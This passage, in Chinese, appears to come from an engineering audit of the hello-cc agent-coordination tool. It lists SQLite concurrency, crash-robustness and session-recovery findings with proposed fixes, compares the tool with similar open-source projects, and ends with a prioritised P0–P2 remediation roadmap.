- **恢复前做面板归属校验,并把面板 id 降为"证据"(sess-01/sess-02):** 抄 **CCB "`slot_key` = AUTHORITY,`pane_id` = EVIDENCE"** 与 **tmux-resurrect "never trust volatile pane ids across restart"**。恢复时以确定性会话名为持久键:`tmux list-panes -t <sessionName> -F '#{pane_id} #{pane_dead} ...'` 取活面板 id,并要求 `tmuxSessionNameForTarget(runtime_target) == tmuxManagedSessionName(pctx,row.id)` 且 HCC_ROOT/HCC_PEER 匹配——**直接复用 `validateTmuxGcCandidate` 的检查**;不符则清 `runtime_target=NULL` 而非收养,会话缺失则标 exited。`shutdown()` 在事务内把在内存的 tmux/external/pty 会话标 detached、置 `runtime_target=NULL`/`status='detached'`。
- **区分"面板报死"与"tmux 命令出错"(sess-03):** 抄 **tmux `remain-on-exit` + `pane-died` hook + `#{pane_dead_status}`**——只在明确 dead/`can't find pane` 时递增 `deadCount`,用更长/退避的确认窗;清 `runtime_target` 前先 `has-session` 核实,或标 `detached` 而非 `exited` 保持可恢复。控制模式 `-CC` 的 `%exit`/`%window-close` 可给出亚秒且带退出码的判定。
- **原子创建或收养 + 完整 id 哈希(sess-04/sess-06):** 抄 **tmux `new-session -A -d -s <name>`** 消除 create 分支的 TOCTOU;peer id 用 `${kind}-${shortHash(providerId)}`(或更长前缀)而非 `slice(0,8)`,并保持 JS 与 shim 派生逐字节一致。sess-06 采用 **park-then-swap**:仅当新会话+attach 成功后才 detach 旧内存会话,失败路径重建会话对象(参 CCB 的 window reflow "build fresh then swap+destroy")。
- **进程存活门 + inode 纪元,或移除死代码(sess-05):** 若保留外部收养,抄 **agents.sh 的 pid→tty→pane join / `kill(pid,0)`** 门控收养,以 inode/epoch 而非裸文件名为键并在 inode 变化时重开 fd(抄 **hcom `reconnect_if_stale()`**);否则整体移除该子系统与其轮询器/watch。
- **中断传播到子树:** 抄 **Unix 进程组**——wrapper 以 `detached:true`(setsid)spawn,程序化/强制 stop 用 `process.kill(-wrapperPid,'SIGINT')` 逐级升级;交互式 Ctrl-C 仍用 `send-keys C-c`(provider 是前台组)。
- **可重建即真相:** 抄 **container-use "state reconstructable from durable substrate"**——把 `mesh.db` 当作可从 tmux(确定性会话名 + 会话 env)重建的缓存,使 `hcc web` 重启无需迁移/修复步骤。

---

### 3.5 并发与数据一致性(SQLite)(conc)

**子系统:** 真正的读改写事务是正确的(`BEGIN IMMEDIATE` + 忙重试,`busy_timeout=5000`),双认领/双获锁被 RESERVED 写锁真正挡住。严重问题在下一层——连接/迁移路径与运行时模型。

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **conc-01** | high | `lib/db/schema.mjs:307` | `connect()` 每次调 `initSchema→runSchemaMigrations`,后者无条件 `tx(db,...)`;即便已迁移,事务体仍重记所有迁移 + `writeSchemaVersion`(`INSERT ... ON CONFLICT DO UPDATE` + `PRAGMA user_version=N`),两者都弄脏页 → 每次 connect 取 RESERVED 写锁 + 追加 WAL 提交;**无只读连接变体**。**场景:** 并发跑多个 `hcc status/peers/task list`(纯读),各自 `BEGIN IMMEDIATE` 互相在忙重试里打转,卡住的写者下 ~3s 后 `SQLITE_BUSY`;纯读项目 `mesh.db-wal` 也膨胀。 |
| **conc-02** | high | `bin/hcc.mjs:429` | `connect()` 调 `migrateRegisteredProjectDbs`,遍历 `readProjectRegistry()`(几乎每命令都会写入当前项目)逐个开 DB `initSchema`(每个都是 `BEGIN IMMEDIATE`),任何失败 `throw REGISTERED_DB_MIGRATION_FAILED` 传出 `connect()`;进程级缓存键含 schema 版本,一次性 CLI 每次调用全量重跑。**场景:** B 的运行时持写事务 >3s,在 A 里跑 `hcc status` → `connect(A)` 扇出开 B 的 DB → `BEGIN IMMEDIATE` 耗尽 30×100ms 重试 → A 的无关读命令死于 `REGISTERED_DB_MIGRATION_FAILED`。 |
| **conc-03** | high | `lib/db/schema.mjs:13` | `DatabaseSync` 全同步;忙路径 `execWithBusyRetry` 循环 `sleepSync=Atomics.wait(...,100)` 阻塞 OS 线程,叠加 `busy_timeout=5000` 在 SQLite 内同步阻塞。Web 运行时是单事件循环线程,还跑各轮询器(每个经 conc-01/02 都是竞争写者)。**场景:** 两 CLI 写者 + 运行时争 `mesh.db`,auto-attach 的 `connect()` 经 `Atomics.wait` 阻塞 3–5s,期间整个运行时冻结,所有浏览器实时终端同时卡死。 |
| **conc-05** | medium | `bin/hcc.mjs:445` | `addEvent` 无界 `INSERT`,~30 处调用(含每心跳、每 hook);唯一删除是手动 `hcc gc`(默认 dry-run);无自动 prune、无行上限、无 `VACUUM`、无 `wal_checkpoint/wal_autocheckpoint`。**场景:** 长跑活跃项目数周累积数十万 events 行,`mesh.db`/`-wal` 稳步膨胀,快照/status 查询(`events ORDER BY id DESC`)与每次写变慢,直到有人记得 `hcc gc --yes`。 |
| **conc-04** | low | `lib/core/coordination/tasks.mjs:76` | 默认 `policy='any'`(CLI `bin/hcc.mjs:1077` + Web `lib/web/peer-actions.mjs:152`),`ok` 恒真无视存活;被夺 owner 之后因 `assertTaskOwnerForMutation`(`row.owner!==peer` 抛 `TASK_OWNED`)被锁在自己任务外。**场景:** B 无 `--policy` 夺走活跃 A 的 task#5,A 再 `update --status done` 被 `TASK_OWNED` 拒。(= hb-07) |
| **conc-06** | low | `lib/coordination-state.mjs:39` | `collectStateSnapshot()` 对 peers/tasks/locks 分别 `.all()`、无外围事务,再喂 `annotateTasksWithLiveness`;`statusSummary()` 用两个独立 COUNT 派生 active/stale。**场景:** 快照组装间 owner X 心跳提交在 peers 查询后、tasks 查询前 → 报 `takeover_ready=true` 于活着的 X;插入两 COUNT 间的 peer 两桶都不计,`active+stale != total`。 |

**推荐修复(引用开源做法):**

- **消除"连接即写"(conc-01/conc-03):** `readSchemaVersion(db) === DB_SCHEMA_VERSION` 时短路 `runSchemaMigrations`(已迁移的 DB 零写事务打开);为读命令提供 readonly `connect()`;仅当确有迁移待跑才取 `BEGIN IMMEDIATE`。抄 **hcom/vibe-kanban 的 WAL 单写者纪律**:`busy_timeout` 先于 `journal_mode=WAL` 设(hello-cc 已正确),并**断言 WAL 切换真的生效**(`PRAGMA journal_mode` 返回 `wal`,否则告警——避免 `ignoreBusy` 掩盖永久回退到 rollback-journal)。设 `PRAGMA synchronous=NORMAL`(WAL 下安全,高频 event/heartbeat 写延迟大降)。轮询器 DB 工作移到 worker 线程或用极小非阻塞超时,绝不在事件循环线程 `Atomics.wait` 数秒。
- **跨项目迁移故障隔离(conc-02):** 不把开/迁移他项目 DB 作为 `connect()` 副作用;命令显式针对某 DB 时才迁移它。若需跨项目迁移则惰性/opt-in,绝不为验版本取写锁,绝不让一个项目的 `SQLITE_BUSY` 打垮无关项目的命令(每个兄弟 DB 迁移包 try/catch,记录并跳过坏的)。
- **保留 + WAL 治理(conc-05):** 抄 **mcp_agent_mail** 的 `PRAGMA wal_autocheckpoint=1000` + `integrity_check` doctor,与 SQLite 指南的 `PRAGMA wal_checkpoint(TRUNCATE)`;events 按行数/年龄环形封顶,低频后台 prune(在 `BEGIN IMMEDIATE` 内小批量删避免长写锁),`hcc gc` 在 Web 启动/每日自动跑而非仅手动。
- **默认策略安全化(conc-04):** 同 hb-07,默认 `blocked-or-stale`/`stale`,夺活 owner 需显式 `--force`。
- **快照单事务(conc-06):** 抄 **squad 的事务内读-标一体**——在单个(deferred 读)事务内组装 peers/tasks/locks,保证一致读视图;active/stale 用一条 `GROUP BY` 而非两个 COUNT。
- **架构级 fencing:** 抄 **CCB 的 generation fencing + Kleppmann tokens**——加单写者租约行(owner pid + generation + last_seen),新运行时启动时 takeover 并 bump generation,旧运行时见更新 generation 即停止其轮询器写入,防两个后台运行时争抢 `mesh.db` / 双绑 :8787。

---

### 3.6 故障与健壮性(rob)

**子系统:** 后台 Web 运行时是单一长驻多路复用器(ws + xterm + tmux 串流 + SQLite),其健壮性**完全押在每回调的 try/catch 上——因为 `bin/hcc.mjs` 里没有任何进程级 `uncaughtException`/`unhandledRejection` 处理器**。多个轮询器在守卫外触达会同步抛错的代码(尤其 `connect()`,做真实磁盘 I/O + 跨项目迁移)。反复出现的根因是:乐观 I/O 无顶层安全网 + 遇损坏即删除的读者。

| id | 等级 | 位置 | 机理 → 失败场景 |
|---|---|---|---|
| **rob-01** | high | `bin/hcc.mjs:2566` | 无进程级异常处理器(仅 SIGINT/SIGTERM)。`scanAndAttachDetectedPeers` 在 try/finally 前 `connect()`;tmux `exitPoller` 的 catch 调 `detachTmuxSession→connect()`(2824,未守卫)。任一抛错传出 interval → 进程退出;且 `autoAttachScanInFlight` 在 connect 前置真、永不复位,永久禁用 auto-attach。**场景:** 另一 hcc 命令持写锁 >5s 或 `.hello-cc` 瞬时 EACCES/ENOSPC → 下个 5s tick `connect()` 抛 `SQLITE_BUSY/CANTOPEN` → 整个后台运行时退出,杀掉所有项目所有 peer 的串流/退出检测/auto-attach。 |
| **rob-02** | high | `lib/runtime/state.mjs:36` | `writeRuntime/writeGlobalRuntime` 裸截断写(无 temp+rename,尽管仓库已有原子 `writeJsonSafe`);每个读者遇解析失败即 `rmSync` 删文件(57,20)。**场景:** ENOSPC 或写入途中被杀 → `runtime.json` 截断 → 下个读者(shim 的 `hcc peer start` 或 `hcc status`)`JSON.parse` 抛 → 删指针 → 运行时活着但稳态下不再重写 → 不可发现,所有 shim 走 `hcc_runtime_unavailable_start_failure` 脱网 exec 真二进制。 |
| **rob-03** | high | `bin/hcc.mjs:431` | `connect()` 无条件 `migrateRegisteredProjectDbs`,任一失败 `throw REGISTERED_DB_MIGRATION_FAILED`;成功缓存仅在 `initSchema` 成功后加,故真损坏的兄弟 DB 每次 connect 都重抛;存在性守卫只跳过缺失文件非损坏文件。**场景:** B 的 `mesh.db` 损坏后,**每个**项目的**每条** hcc 命令都在 `connect()` 抛错,运行时 auto-attach 每 5s 抛错;叠加 rob-01 → 运行时崩溃循环。单个损坏文件 brick 整个多项目控制平面。 |
| **rob-06** | medium(PLAUSIBLE) | `bin/hcc.mjs:2499` | `fs.watch(bufsDir,...)` 的 `try/catch` 只护同步构造调用;FSWatcher 是 EventEmitter,无 `'error'` 监听器时 Node 把异步 `'error'` 重抛为未捕获异常;shutdown 也从不 close。**场景:** Linux inotify 触顶或 bufs 被删 → watcher 发 `'error'` → 无监听 → 整个运行时退出;watcher fd 泄漏。 |
| **rob-05** | low | `lib/runtime/state.mjs:120` | `clearRuntime` 快乐路径按 `pid` 归属守卫删除,但 catch 分支无条件 `rmSync`(120/129);因 writeRuntime 非原子,不可解析文件是可达状态。**场景:** 运行时 A 刚非原子写完 global 指针(momentarily partial),旧实例 B 收 SIGTERM 跑 `clearRuntime`,读到部分文件抛错 → catch 删除**实属 A 的**指针 → 孤立 A;本应防跨实例覆盖的 pid 守卫恰在最需要时被绕过。 |
| **rob-07** | low | `bin/hcc.mjs:4370` | 全局运行时为多项目各写一个 per-project 指针,但 shutdown 只 `clearRuntime(ctx)`(仅本 ctx + global 且 pid 匹配),无代码枚举其他已注册项目清其指针。**场景:** 服务 A/B/C 的运行时收 SIGTERM,A + global 被清,但 `B/.hello-cc/runtime.json`、`C/...` 仍指向死进程,非探测的 `readRuntime` 返回陈旧 base_url,请求 connection-refused 直到 shim 的 `RUNTIME_UNREACHABLE` 兜底。(= bg-01/bg-07 家族) |

**推荐修复(引用开源做法):**

- **顶层兜底(rob-01/rob-06):** 注册 `process.on('uncaughtException')`/`process.on('unhandledRejection')` 记入 `web.log` 并保活(或做干净重启);每个 `setInterval` 回调体整体包 try/catch,in-flight 标志在 finally 复位;`fs.watch` 保存句柄、`.on('error',...)` 记录并可重装、shutdown 里 `close()`。抄 **supervisord/pm2 的重启状态机 + flap 保护**(`startsecs`/`min_uptime` ~30s、指数退避 500ms×1.5 至 15s、N 次不稳后进 `fatal` 由 UI 提示人工介入),避免对崩溃循环 peer 的疯狂重连。
- **发现指针原子化 + 不遇错即删(rob-02/rob-05/rob-07):** 用已有 `writeJsonSafe`(temp + `renameSync`)路由所有 runtime 指针写;读者遇单次解析失败不立即删——重试,仅确认所引用 pid 已死后才隔离;catch 分支绝不盲删,留给探测/健康检查回收;shutdown 遍历项目注册表清理引用本运行时 pid/base_url 的所有指针。抄 **vibe-kanban #2934 的"kill 前先验证身份"**教训:任何 reaper/reclaim 路径 kill 前须同时匹配 pid + tmux 会话名 + 存储的 owner 标记,绝不误杀运行时自身或复用 pid 的无关进程。
- **跨项目迁移隔离(rob-03):** 同 conc-02,每个兄弟 DB 迁移包 try/catch,记录并跳过损坏者(surface 警告),绝不让外项目 DB 健康门控当前项目连接。抄 **hcom fail-closed**:若磁盘 schema 比本二进制更新/不兼容,归档 `mesh.db` 到时间戳备份并拒绝,而非损坏共享状态。
- **可重建即真相:** 抄 **container-use / hcom** ——把派生状态(`lastBroadcastTime`、定时器截止、externalScan 结果)存进 `mesh.db` 按会话键行,使运行时崩溃/重启是无状态恢复;`runtime.json` 当缓存、`mesh.db` 当真相。安全态(bind host / TLS / auth mode)写进 `runtime.json` 使运维与 status 命令一眼可见暴露面(抄 **code-server 声明式 config.yaml**)。

---

## 4. 与同类开源项目对比

| 关注问题 | 同类开源如何解决 | hello-cc 现状 | 应采纳 |
|---|---|---|---|
| **后台状态与恢复** | vibe-kanban:启动 + 周期 reconciliation,把上轮遗留 RUNNING 标 failed、清孤儿 worktree;container-use:无权威守护 DB,状态可从 git 重建;craftzdog:确定性会话名 `claude-<hash-of-dir>` + 状态写在 tmux option;hcom:`reconnect_if_stale()` 按 inode 变化重开连接 | 信任本地 `runtime.json` 无存活检查(bg-01);shutdown 遗留兄弟指针(rob-07);无 boot 对账;运行时长持一个 DB 句柄不检 inode | boot + interval reaper 核对 tmux/pid;确定性会话名幂等重接;`mesh.db` 当可重建缓存;inode 守卫;`runtime.json` 记安全态 |
| **心跳与存活** | tmux-agent-status:纯 hooks 驱动(UserPromptSubmit/Stop),进程存在性兜底;CCB:从 `pane_dead` 判死、心跳仅诊断;claude-squad/uzi:pane 内容哈希判 busy/idle;systemd:半间隔看门狗;supervisord/tmux:SIGCHLD 即时 reap + `remain-on-exit`+`pane_dead_status`;Kleppmann:单调 fencing token | 纯被动 `now-last_seen<=600`,死亡路径反把 `last_seen=now()`(hb-01);无 reaper(hb-02);终端 I/O 不刷新(hb-04);墙钟(hb-05);默认 `any` 夺活 owner(hb-07) | HARD-DEAD(tmux 事实/`pane_dead`,立即 exited)+ SOFT-STALE 二态;hooks 即时心跳;pane 哈希兜底;续期比 TTL/2;单调时钟 + `lock_epoch` fencing;默认策略 `blocked-or-stale` |
| **远程访问与安全** | vibe-kanban/code-server/wetty/ttyd:默认 `127.0.0.1`,暴露需显式并告警;code-server:cookie 会话 + ARGON2 + 登录限流;ttyd:`--check-origin` 防 CSWSH、默认只读、`--max-clients`、TLS/mTLS;CCB:loopback + Cloudflare 命名隧道、scoped 短时 token、输入帧单调序号、revocation cascade、payload 脱敏;hcom:token 无过期/吊销是"头号遗憾" | 默认 `0.0.0.0:8787` 无 TLS(net-01);token 走 URL + 进 world-readable log(net-02);全局永不轮换 + 任意 DB(net-03);WS 无 Origin/Host 且空 token fail-open(net-04);action token 形同虚设(net-05) | 默认 loopback + 显式暴露告警 + 非 loopback 强制 token/TLS;cookie 会话替代 URL token;`--check-origin` + Host 校验;每运行时 token + 过期/吊销 + 路径 allowlist;`timingSafeEqual`;输入帧序号防重放 |
| **并发与数据一致性** | hcom:每读改写 `BEGIN IMMEDIATE`(注释明言 busy_timeout 挡不住 deferred 读→写升级)、`busy_timeout` 先于 WAL、单连接/进程、DB 属主专属权限、`synchronous=NORMAL`;squad:`lease_owner+lease_expires_at`、事务内读-标一体、per-peer cursor、幂等 additive `ALTER TABLE`;mcp_agent_mail:`wal_autocheckpoint`、`integrity_check` doctor;Kleppmann/systemd:单调时钟 + fencing | 核心事务已正确;但"连接即写"串行化所有连接(conc-01)、跨项目扇出耦合(conc-02)、同步 `Atomics.wait` 冻结事件循环(conc-03);events/WAL 无界(conc-05);快照非事务(conc-06) | 已迁移即短路免写事务 + readonly 连接;跨项目迁移隔离;`synchronous=NORMAL`+`wal_autocheckpoint`+ 自动 prune;快照单事务;`lock_epoch` fencing;DB 文件 0600;WAL 生效断言 |

---

## 5. 改进路线图

优先级:**P0 = 安全 / 数据丢失 / 崩溃**,先做;P1 = 正确性与可用性;P2 = 加固与卫生。每项标注它解决的 finding id。

### P0 —— 立即(阻断任何超出 loopback 的暴露与运行时级崩溃)

1. **加进程级异常兜底 + 加固所有轮询器/upgrade。** 注册 `uncaughtException`/`unhandledRejection`(记 `web.log`、保活);把 `connect()` 移入 try、in-flight 标志在 finally 复位;WS upgrade 整体包 try/catch,出错 `socket.destroy()`;`fs.watch` 加 `'error'` 监听。**解决 bg-02、bg-03、rob-01、rob-06。**
2. **跨项目 DB 迁移故障隔离。** 每个兄弟 DB 迁移包 try/catch,记录并跳过损坏者,绝不 `throw` 出 `connect()`;不兼容更新 schema 时归档 + 拒绝(hcom fail-closed)。**解决 conc-02、rob-03。**
3. **Web 默认绑 `127.0.0.1`;暴露需显式 `--host/--expose` + 醒目告警;非 loopback 无 token 拒绝启动;`--no-token` 强制 loopback。** **解决 net-01、net-04(绑定层)。**
4. **凭证移出 URL/日志:改 `Authorization`/`SameSite=Strict HttpOnly` cookie;`web.log` 建为 0600;非 loopback 强制 TLS;加 `Referrer-Policy: no-referrer` + CSP;`timingSafeEqual`。** **解决 net-02、net-06。**
5. **WS upgrade 校验 Origin + Host;修复 `authOk` 空 token fail-open(仅 loopback 允许无 token)。** **解决 net-04。**
6. **每运行时/每项目铸 token + 过期/吊销;`project/root/db` 强制在已注册项目 `.hello-cc` 内的 allowlist 校验。** **解决 net-03、net-07。**
7. **`runtime.json` 全部经 `writeJsonSafe` 原子写;读者遇解析失败不立即删(重试 + 确认 pid 死后再隔离);`clearRuntime` catch 分支不盲删。** **解决 rob-02、rob-05、bg-07。**
8. **恢复路径做面板归属校验(复用 `validateTmuxGcCandidate`):要求会话名 + HCC_ROOT 匹配,否则清 `runtime_target` 而非收养。** **解决 sess-01。**
9. **修复"死 owner 读成 active":`status in ('exited','detached')` 视为立即非活;死亡转移不前推 `last_seen_at`。** **解决 hb-01。**

### P1 —— 近期(正确性与可用性)

10. **消除"连接即写":已迁移即短路 `runSchemaMigrations`,提供 readonly `connect()`;设 `synchronous=NORMAL`;轮询器 DB 工作非阻塞化。** **解决 conc-01、conc-03。**
11. **存活 reaper(boot + interval),从 tmux 事实判死(`pane_dead`/`has-session`);外部 exitPoller 写 peers 表。** **解决 hb-02、hb-03,并为 hb-04 铺路。**
12. **终端真实 I/O 节流刷新 `last_seen_at`(每 30–60s)。** **解决 hb-04。**
13. **默认 takeover 策略改 `blocked-or-stale`,夺活 owner 需显式 `--force`;`takeOverTaskForPeer` 复用存活信号。** **解决 hb-07、conc-04。**
14. **锁续期并入 hook/heartbeat 路径(或锁寿命跟随 peer 存活)。** **解决 hb-06。**
15. **`readRuntime` 返回前校验 pid 存活;`shutdown`/`clearRuntime` 遍历注册表清理引用本 pid 的所有指针。** **解决 bg-01、rob-07。**
16. **`shutdown` 在事务内标 detached / 置 `runtime_target=NULL`;恢复查询加 status+存活+活面板归属守卫。** **解决 sess-02。**
17. **exit poller 区分"面板报死"与"tmux 命令出错",用退避确认窗;清绑定前 `has-session` 核实。** **解决 sess-03。**
18. **action token 不序列化给所有客户端;`/input`、生成、WS 路径要求真正的每会话密钥。** **解决 net-05。**

### P2 —— 加固与卫生

19. **peer id 用完整 provider id 哈希(去掉 `slice(0,8)`),JS 与 shim 逐字节一致。** **解决 sess-04。**
20. **按已注册项目分别驱动 external-buffer watch 与 auto-attach(或 tmux `-CC` 单事件流)。** **解决 bg-04。**
21. **events/WAL 治理:`wal_autocheckpoint=1000` + 周期 `wal_checkpoint(TRUNCATE)` + 自动/批量 prune + `hcc doctor`(`integrity_check`)。** **解决 conc-05。**
22. **协调快照在单个 deferred 读事务内组装;active/stale 用一条 `GROUP BY`。** **解决 conc-06。**
23. **单调时钟 + 墙钟跳变检测(grace 窗抑制 stale/takeover);引入 `lock_epoch`/`takeover_seq` fencing。** **解决 hb-05,并强化 hb-01/hb-06/conc-04。**
24. **`upsertPeer` 用 `COALESCE` 保留 status;禁止非显式 restart 路径把 peer 迁出 `exited`。** **解决 hb-08。**
25. **失败 restart 采 park-then-swap 或在 catch 重建会话对象。** **解决 sess-06。**
26. **移除或以进程存活/inode 纪元门控外部收养子系统(及其死代码生产者)。** **解决 sess-05。**
27. **`web.log` 轮换;注册表只读请求不落盘 + 去抖 + 原子写。** **解决 bg-05、bg-06。**
28. **DB 文件/目录属主专属权限(0600/0700);断言 WAL 切换生效。** (hcom 加固,防多用户主机泄露 token/messages)

> **落地次序建议:** P0-1/2 与 P0-3…6 可并行(前者堵崩溃,后者堵网络暴露),二者共同构成"可安全在局域网/长跑使用"的最小门槛;P0-7/8/9 紧随以消除数据串接与发现层丢失。P1 后再引入 P2-23 的 fencing 架构改造,使正确性不再依赖时钟正确。